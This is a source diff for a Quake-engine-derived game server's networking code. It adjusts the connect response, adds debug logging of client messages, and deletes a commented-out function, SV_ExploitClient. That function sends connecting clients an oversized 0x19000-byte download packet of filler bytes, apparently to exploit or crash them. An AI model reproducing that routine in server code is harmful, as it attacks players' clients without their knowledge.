@@ -662,7 +662,7 @@ __optimize3 __regparm1 void SV_DirectConnect( netadr_t *from ) {
 
 	// send the connect packet to the client
 	if(sv_modStats->boolean){
-	    NET_OutOfBandPrint( NS_SERVER, from, "connectResponse %s", fs_game->string);
+	    NET_OutOfBandPrint( NS_SERVER, from, "connectResponse %s", fs_gameDirVar->string);
 	}else{
 	    NET_OutOfBandPrint( NS_SERVER, from, "connectResponse");
 	}
@@ -1426,28 +1426,6 @@ int SV_GetUid(unsigned int clnum){
 
 
 /*
-void SV_ExploitClient(client_t *cl, msg_t* msg){
-
-
-	byte buffer[0x19000];
-
-	Com_Memset(buffer, 0xc ,sizeof(buffer));
-
-	Com_Printf("^6Debug Test\n");
-	cl->exploitOn = qfalse;
-
-	MSG_WriteByte(msg, svc_download);
-	MSG_WriteLong(msg, 1);
-	MSG_WriteShort(msg, sizeof(buffer));
-	MSG_WriteData(msg, buffer, sizeof(buffer));
-
-}
-*/
-
-
-
-
-/*
 ==================
 SV_WWWRedirect
 
@@ -1492,11 +1470,7 @@ Fill up msg with data
 __cdecl void SV_WriteDownloadToClient( client_t *cl, msg_t *msg ) {
 	int curindex;
 	char errorMessage[1024];
-/*
-	if(cl->exploitOn){
-		SV_ExploitClient(cl, msg);
-	}
-*/
+
 	if ( !*cl->downloadName ) {
 		return; // Nothing being downloaded
 	}
@@ -1824,6 +1798,7 @@ __optimize3 __regparm2 void SV_ExecuteClientMessage( client_t *cl, msg_t *msg ) 
 			while(qtrue)
 			{
 				c = MSG_ReadBits(&decompressMsg, 3);
+				Com_DPrintf("Received A Message- Len: %d Command: %d\n", decompressMsg.cursize, c);
 				if(c == clc_clientCommand)
 				{
 					if ( !SV_ClientCommand( cl, &decompressMsg, 1 ) || cl->state == CS_ZOMBIE)
@@ -1852,7 +1827,7 @@ __optimize3 __regparm2 void SV_ExecuteClientMessage( client_t *cl, msg_t *msg ) 
 	while(qtrue)
 	{
 		c = MSG_ReadBits(&decompressMsg, 3);
-
+		Com_DPrintf("Received B Message- Len: %d Command: %d\n", decompressMsg.cursize, c);
 		if(c == clc_clientCommand){ //2
 				if ( !SV_ClientCommand( cl, &decompressMsg, 0 ) || cl->state == CS_ZOMBIE ) {
 					return; // we couldn't execute it because of the flood protection
